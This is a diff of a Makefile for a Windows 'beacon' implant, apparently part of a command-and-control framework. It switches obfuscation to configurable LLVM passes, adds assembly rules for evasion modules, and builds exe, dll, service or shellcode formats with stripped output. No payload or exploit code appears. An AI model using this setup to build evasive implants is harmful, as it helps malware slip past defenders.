@@ -13,19 +13,21 @@ BEACON   := __NAME__
 CXX_X64  := x86_64-w64-mingw32-g++
 CXX_X86  := i686-w64-mingw32-g++
 
-# ── OLLVM obfuscation (opt-in) ──────────────────────────────────────────────────────────
-# Set OLLVM=1 to switch from standard MinGW g++ to ollvm-mingw clang++.
-# The clang++ binaries must be in the server's PATH.
-# OLLVM_SEED: reproducible seed for OLLVM passes (optional)
-OLLVM      ?= 0
-OLLVM_SEED ?=
+# ── LLVM obfuscation (opt-in) ────────────────────────────────────────────────────────
+# Set LLVM_COMPILER to the compiler binary (absolute path or name in PATH).
+# Set LLVM_FLAGS for obfuscation passes (e.g. -mllvm -irobf-indbr ...).
+# Set LLVM_TARGET for cross-compilation target (e.g. x86_64-w64-mingw32).
+LLVM_COMPILER ?=
+LLVM_FLAGS    ?=
+LLVM_TARGET   ?=
 
-ifeq ($(OLLVM),1)
-    CXX_X64 := x86_64-w64-mingw32-clang++
-    CXX_X86 := i686-w64-mingw32-clang++
-    OLLVM_FLAGS := -mllvm -fla -mllvm -sub -mllvm -bcf -mllvm -sobf
-    ifneq ($(OLLVM_SEED),)
-        OLLVM_FLAGS += -mllvm -seed=$(OLLVM_SEED)
+ifneq ($(LLVM_COMPILER),)
+    CXX_X64 := $(LLVM_COMPILER)
+    CXX_X86 := $(LLVM_COMPILER)
+    # clang++ may not link libstdc++ by default; add it explicitly
+    LLVM_CXX_LIBS := -lstdc++
+    ifneq ($(LLVM_TARGET),)
+        CXXFLAGS += --target=$(LLVM_TARGET)
     endif
 endif
 
@@ -47,9 +49,9 @@ ALL_TARGETS += x86
 endif
 
 ifeq ($(OS),Windows_NT)
-CLEAN_CMD := powershell -NoProfile -Command "Remove-Item -Force '$(BEACON)_x64*','$(BEACON)_x86*','$(BEACON)_svc*' -ErrorAction SilentlyContinue"
+CLEAN_CMD := powershell -NoProfile -Command "Remove-Item -Force '$(BEACON)_x64*','$(BEACON)_x86*','$(BEACON)_svc*','evasion\*_x64.o','evasion\*_x86.o','*_x64.o','*_x86.o' -ErrorAction SilentlyContinue"
 else
-CLEAN_CMD := rm -f $(BEACON)_x64* $(BEACON)_x86* $(BEACON)_svc*
+CLEAN_CMD := rm -f $(BEACON)_x64* $(BEACON)_x86* $(BEACON)_svc* evasion/*_x64.o evasion/*_x86.o *_x64.o *_x86.o
 endif
 
 # Format selection: exe | dll | svc | shellcode
@@ -66,9 +68,9 @@ CXXFLAGS := -std=c++17 -Os -fno-stack-protector -fno-strict-overflow \
 LDFLAGS  := -s -Wl,-s,--gc-sections -static-libgcc -static-libstdc++ -mwindows
 DEFINES  :=
 
-# Append OLLVM passes when enabled
-ifeq ($(OLLVM),1)
-    CXXFLAGS += $(OLLVM_FLAGS)
+# Append LLVM obfuscation flags when compiler is set
+ifneq ($(LLVM_FLAGS),)
+    CXXFLAGS += $(LLVM_FLAGS)
 endif
 
 # Sideloading: path to .def file for export forwarding (set by plugin)
@@ -114,18 +116,37 @@ endif
 SOURCES := $(wildcard impl/*.cpp) crypto/crypto.cpp protocol/protocol.cpp config.cpp main.cpp
 # __EVASION_SOURCES__
 
+# Assembly sources (GAS syntax, Intel mode) — no-op when no .S files exist
+ASM_SOURCES   := $(wildcard evasion/*.S)
+BOOTSTRAP_ASM := $(wildcard *.S)
+ASM_OBJS_X64  := $(ASM_SOURCES:.S=_x64.o) $(BOOTSTRAP_ASM:.S=_x64.o)
+ASM_OBJS_X86  := $(ASM_SOURCES:.S=_x86.o) $(BOOTSTRAP_ASM:.S=_x86.o)
+
 .PHONY: all x64 x86 clean
 
 all: $(ALL_TARGETS)
 
-x64:
+# ASM compilation rules (pattern rules — no-op when no .S files exist)
+evasion/%_x64.o: evasion/%.S
+	$(CXX_X64) -c -masm=intel -o $@ $<
+
+evasion/%_x86.o: evasion/%.S
+	$(CXX_X86) -c -masm=intel -o $@ $<
+
+%_x64.o: %.S
+	$(CXX_X64) -c -masm=intel -o $@ $<
+
+%_x86.o: %.S
+	$(CXX_X86) -c -masm=intel -o $@ $<
+
+x64: $(ASM_OBJS_X64)
 	@echo "[*] Building $(BEACON) x64 ($(FORMAT))..."
-	$(CXX_X64) $(CXXFLAGS) $(DEFINES) $(EXTRA_DEFINES) $(LDFLAGS) -o $(BEACON)$(EXT_X64) $(SOURCES) -lws2_32 -lwinhttp
+	$(CXX_X64) $(CXXFLAGS) $(DEFINES) $(EXTRA_DEFINES) $(LDFLAGS) -o $(BEACON)$(EXT_X64) $(SOURCES) $(ASM_OBJS_X64) -lws2_32 -lwinhttp $(LLVM_CXX_LIBS)
 	@echo "[+] $(BEACON)$(EXT_X64)"
 
-x86:
+x86: $(ASM_OBJS_X86)
 	@echo "[*] Building $(BEACON) x86 ($(FORMAT))..."
-	$(CXX_X86) $(CXXFLAGS) $(DEFINES) $(EXTRA_DEFINES) $(LDFLAGS) -o $(BEACON)$(EXT_X86) $(SOURCES) -lws2_32 -lwinhttp
+	$(CXX_X86) $(CXXFLAGS) $(DEFINES) $(EXTRA_DEFINES) $(LDFLAGS) -o $(BEACON)$(EXT_X86) $(SOURCES) $(ASM_OBJS_X86) -lws2_32 -lwinhttp $(LLVM_CXX_LIBS)
 	@echo "[+] $(BEACON)$(EXT_X86)"
 
 clean: ; @$(CLEAN_CMD)
